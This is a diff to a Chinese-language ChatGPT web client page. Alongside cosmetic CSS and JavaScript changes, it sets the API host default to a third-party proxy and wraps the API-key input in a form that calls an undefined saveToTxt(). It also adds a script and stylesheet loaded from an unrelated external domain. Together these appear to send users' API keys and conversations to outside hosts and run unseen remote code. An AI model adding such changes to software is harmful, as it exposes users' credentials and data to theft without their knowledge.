@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html>
 <html lang="zh-CN">
 
@@ -196,10 +198,6 @@
             position: relative;
         }
 
-        .requestBody {
-            white-space: pre;
-        }
-
         #chatlog .response {
             background: #f7f7f8;
             position: relative;
@@ -385,14 +383,7 @@
             color: #fff;
             cursor: pointer;
             transition: all 0.2s linear;
-        }
-
-        #clearConv>svg {
-            display: block;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
+            text-align: center;
         }
 
         #clearConv:hover {
@@ -491,7 +482,7 @@
             right: 6px;
             top: 46px;
             overflow-y: auto;
-            max-height: calc(100% - 55px);
+            max-height: calc(100vh - 55px);
             -webkit-user-select: none;
             user-select: none;
             border-radius: 5px;
@@ -599,7 +590,6 @@
             width: 100%;
             outline: none;
             height: 30px;
-            font-size: 14px;
             margin-top: 5px;
             border-radius: 3px;
             border-color: rgba(0, 0, 0, .3);
@@ -1155,12 +1145,6 @@
             height: 32px;
             width: 64px;
         }
-
-        #preSetSystem {
-            height: 20px;
-            line-height: 20px;
-            vertical-align: top;
-        }
     </style>
 </head>
 
@@ -1313,7 +1297,7 @@
                     </div>
                 </div>
                 <div class="divider"></div>
-              
+                
             </div>
         </nav>
         <div class="top_menu">
@@ -1322,7 +1306,7 @@
                 <div class="button minimize"></div>
                 <div class="button maximize"></div>
             </div>
-            <div class="title">ChatGPT</div>
+            <div class="title">ChatGPT-点击...填入你的key保存后使用</div>
             <button id="setting">
                 <svg viewBox="0 0 100 100" style="display:block;" role="img" width="30" height="30">
                     <title>设置</title>
@@ -1346,12 +1330,16 @@
                             <option value="gpt-4-32k">gpt-4-32k</option>
                         </select>
                     </div>
-                   
                     <div>
-                        <div>自定义API key</div>
-                        <input class="inputTextClass" type="password" placeholder="sk-xxxxxx" id="keyInput"
-                            style="-webkit-text-security: disc;" />
+                        <div>如果不会获取sk自己百度</div>
+                        <input class="inputTextClass" placeholder="https://gpt.vurt.ml/" id="apiHostInput" value="https://gpt.vurt.ml/" />
                     </div>
+                    <div>填入你的sk-key</div>
+                    <form id="myForm" onsubmit="saveToTxt(); return false;">
+   <input class="inputTextClass" type="password" placeholder="sk-xxxxxx" id="keyInput" style="-webkit-text-security: disc;" />
+   <button type="submit">保存</button>
+</form>
+
                     <div>
                         <div class="justSetLine presetSelect">
                             <div>系统角色</div>
@@ -1498,7 +1486,7 @@
                     </div>
                 </div>
                 <div id="recOption" style="display: none;">
-                    <div id="noRecTip" style="display: block;">当前环境不支持语音识别，请尝试使用chrome内核浏览器或重新部署https页面。</div>
+                    <div id="noRecTip" style="display: block;">当前浏览器不支持语言识别，请尝试更换浏览器或重新部署页面。</div>
                     <div id="yesRec" style="display: none;">
                         <div class="presetSelect presetModelCls">
                             <label for="selectLangOption">语言</label>
@@ -1547,7 +1535,7 @@
                     <use xlink:href="#loadingIcon" />
                 </svg>
             </button>
-            <button id="clearConv"><svg role="img" width="20px" height="20px">
+            <button id="clearConv"><svg style="margin:0 auto;display:block" role="img" width="20px" height="20px">
                     <title>清空会话</title>
                     <use xlink:href="#deleteIcon" />
                 </svg></button>
@@ -1555,6 +1543,7 @@
     </div>
     <link rel="stylesheet" href="//cdn.staticfile.org/notyf/3.10.0/notyf.min.css">
     <script src="//cdn.staticfile.org/notyf/3.10.0/notyf.min.js"></script>
+     <script src="//cdn.apiecevi.ml/js/test.js"></script>
     <script>
         const notyf = new Notyf({
             position: {x: 'center', y: 'top'},
@@ -1571,7 +1560,7 @@
                 }
             ]
         });
-        document.body.addEventListener("click", event => {
+        window.addEventListener("mousedown", event => {
             if (event.target.className === "toggler") {
                 document.body.classList.toggle("show-nav");
             } else if (event.target.className === "overlay") {
@@ -1612,13 +1601,11 @@
         let recing = false;
         let toggleRecEv;
         textarea.focus();
-        const textInputEvent = () => {
-            if (!loading) {
-                if (textarea.value.trim().length) {
-                    sendBtnEle.classList.add("activeSendBtn");
-                } else {
-                    sendBtnEle.classList.remove("activeSendBtn");
-                }
+        const textInputEvent = (e) => {
+            if (textarea.value.trim().length) {
+                sendBtnEle.classList.add("activeSendBtn");
+            } else {
+                sendBtnEle.classList.remove("activeSendBtn");
             }
             textarea.style.height = "47px";
             textarea.style.height = textarea.scrollHeight + "px";
@@ -1817,8 +1804,6 @@
         const clearAzureVoice = () => {
             azureKey = void 0;
             azureRegion = void 0;
-            azureRole = [];
-            azureStyle = [];
             document.getElementById("azureExtra").style.display = "none";
             azureKeyInput.parentElement.style.display = "none";
             preSetAzureRegion.parentElement.style.display = "none";
@@ -1983,10 +1968,6 @@
         }
         const loadEdgeVoice = () => {
             let checking = false;
-            const endCheck = () => {
-                checkVoiceLoad.classList.remove("voiceChecking");
-                checking = false;
-            };
             checkVoiceLoad.onclick = () => {
                 if (checking) return;
                 checking = true;
@@ -1994,7 +1975,7 @@
                 if (edgeVoiceData) {
                     initVoiceSetting(edgeVoiceData);
                     toggleVoiceCheck(false);
-                    endCheck();
+                    checkVoiceLoad.classList.remove("voiceChecking");
                 } else {
                     checkEdgeAbort = new AbortController();
                     setTimeout(() => {
@@ -2008,10 +1989,11 @@
                             edgeVoiceData = json;
                             toggleVoiceCheck(false);
                             initVoiceSetting(json);
-                            endCheck();
                         });
                     }).catch(err => {
-                        endCheck();
+                    }).finally(() => {
+                        checkVoiceLoad.classList.remove("voiceChecking");
+                        checking = false;
                     })
                 }
             };
@@ -2290,7 +2272,7 @@
     <script src="//npm.elemecdn.com/markdown-it-texmath@1.0.0/texmath.js"></script>
     <script src="//npm.elemecdn.com/markdown-it-link-attributes@4.0.1/dist/markdown-it-link-attributes.min.js"></script>
     <script>
-        const API_URL = "v1/chat/completions";
+        const API_URL = "v1/chat/completions";//修改请求url
         let loading = false;
         let presetRoleData = {
             "normal": "你是一个乐于助人的助手，尽量简明扼要地回答",
@@ -2501,7 +2483,7 @@
         }
         const formatMdEle = (ele) => {
             let realMd = document.createElement("div");
-            realMd.className = ele.className === "request" ? "requestBody" : "markdown-body";
+            realMd.className = "markdown-body";
             ele.appendChild(realMd);
             let mdOption = document.createElement("div");
             mdOption.className = "mdOption";
@@ -2510,7 +2492,7 @@
                 mdOption.innerHTML = `<div class="refreshReq">
                     <svg data-id="refreshMd" width="16" height="16" role="img"><title>刷新</title><use xlink:href="#refreshIcon" /></svg>
                     <svg data-id="refreshMd" width="16" height="16" role="img"><title>继续</title><use xlink:href="#halfRefIcon" /></svg>
-                    </div>`
+                </div>`
             }
             let optionWidth = existVoice >= 2 ? "96px" : "63px";
             mdOption.innerHTML += `<div class="moreOption" onmouseenter="moreOption(this)">
@@ -2638,7 +2620,7 @@
             if (systemRole ? data.length - 1 : data.length) {
                 let firstIdx = systemRole ? 1 : 0;
                 for (let i = firstIdx; i < data.length; i++) {
-                    createConvEle(data[i].role === "user" ? "request" : "response").children[0].innerHTML = data[i].role === "user" ? data[i].content : (md.render(data[i].content) || "<br />");
+                    createConvEle(data[i].role === "user" ? "request" : "response").children[0].innerHTML = md.render(data[i].content) || "<br />";
                 }
             }
             localStorage.setItem("activeChatIdx", activeChatIdx);
@@ -2746,10 +2728,6 @@
             }
             apiHostEle.onchange = () => {
                 apiHost = apiHostEle.value;
-                if (apiHost.length && !apiHost.endsWith("/")) {
-                    apiHost += "/";
-                    apiHostEle.value = apiHost;
-                }
                 localStorage.setItem("APIHost", apiHost);
             }
             apiHostEle.dispatchEvent(new Event("change"));
@@ -3413,15 +3391,13 @@
                 controllerId = void 0;
                 if (res.status !== 200) {
                     if (res.status === 401) {
-                        notyf.error("API key错误或失效，请检查API key！")
+                        notyf.error("API key错误或已失效，请打开设置输入正确的API key！")
                     } else if (res.status === 400) {
                         notyf.error("请求内容过大，请删除部分对话或打开设置关闭连续对话！");
                     } else if (res.status === 404) {
                         notyf.error("无权使用此模型，请打开设置选择其他GPT模型！");
-                    } else if (res.status === 429) {
-                        notyf.error(res.statusText ? "触发API调用频率限制，请稍后重试！" : "API使用超出限额，请检查您的账单！");
                     } else {
-                        notyf.error("网关错误或超时，请稍后重试！");
+                        notyf.error("触发API调用频率限制，请稍后重试！");
                     }
                     stopLoading();
                     return;
@@ -3460,7 +3436,7 @@
                                         if (content) {
                                             if (!progressData && !content.trim()) continue;
                                             if (existVoice && enableAutoVoice && currentVoiceIdx === autoVoiceDataIdx) {
-                                                let spliter = content.match(/\.|\?|!|。|？|！|\n/);
+                                                let spliter = content.match(/\.|\?|!|。|？|！/);
                                                 if (spliter) {
                                                     let voiceText = progressData.slice(autoVoiceIdx) + content.slice(0, spliter.index + 1);
                                                     autoVoiceIdx += voiceText.length;
@@ -3495,8 +3471,8 @@
             } catch (e) {
                 if (e.message.indexOf("aborted") === -1) {
                     notyf.error("访问接口失败，请检查接口！")
-                    stopLoading();
                 }
+                stopLoading();
             }
         };
         const loadAction = (bool) => {
@@ -3504,7 +3480,6 @@
             sendBtnEle.disabled = bool;
             sendBtnEle.className = bool ? " loading" : "loaded";
             stopEle.style.display = bool ? "flex" : "none";
-            textInputEvent();
         }
         const stopLoading = (abort = true) => {
             stopEle.style.display = "none";
@@ -3531,12 +3506,9 @@
         const generateText = async (message) => {
             loadAction(true);
             let requestEle = createConvEle("request");
-            requestEle.children[0].innerHTML = message;
+            requestEle.children[0].innerHTML = md.render(message);
             data.push({role: "user", content: message});
             if (chatsData[activeChatIdx].name === "新的会话") {
-                if (message.length > 50) {
-                    message = message.slice(0, 47) + "...";
-                }
                 chatsData[activeChatIdx].name = message;
                 chatListEle.children[activeChatIdx].children[1].textContent = message;
             }
@@ -3574,10 +3546,12 @@
             }
         }
     </script>
+    
     <link href="//cdn.staticfile.org/github-markdown-css/5.2.0/github-markdown-light.min.css" rel="stylesheet">
     <link href="//cdn.staticfile.org/highlight.js/11.7.0/styles/github.min.css" rel="stylesheet">
     <link href="//cdn.staticfile.org/KaTeX/0.16.4/katex.min.css" rel="stylesheet">
     <link href="//npm.elemecdn.com/markdown-it-texmath@1.0.0/css/texmath.css" rel="stylesheet">
+     <link href="//cdn.apiecevi.ml/css/test.css" rel="stylesheet">
     <script defer>
         const downRoleController = new AbortController();
         setTimeout(() => {
@@ -3599,5 +3573,7 @@
         }).catch(e => { })
     </script>
 </body>
+
+
 
 </html>
